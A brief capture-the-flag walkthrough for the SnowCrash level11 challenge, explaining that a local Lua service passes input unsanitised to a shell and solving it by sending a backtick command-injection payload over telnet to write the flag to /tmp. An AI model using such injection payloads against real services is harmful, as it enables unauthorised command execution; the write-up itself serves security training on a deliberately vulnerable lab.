There is a lua script in our home that listen on `localhost:5151`.

The string received is then echoed and piped to `sha1sum` to do whatever.

We can run the command as the input is not sanitized `getflag`.

```bash
level11@SnowCrash:~$ telnet localhost 5151
Trying 127.0.0.1...
Connected to localhost.
Escape character is '^]'.
Password: `getflag` > /tmp/token
Erf nope..
Connection closed by foreign host.
```

```bash
cat /tmp/token
```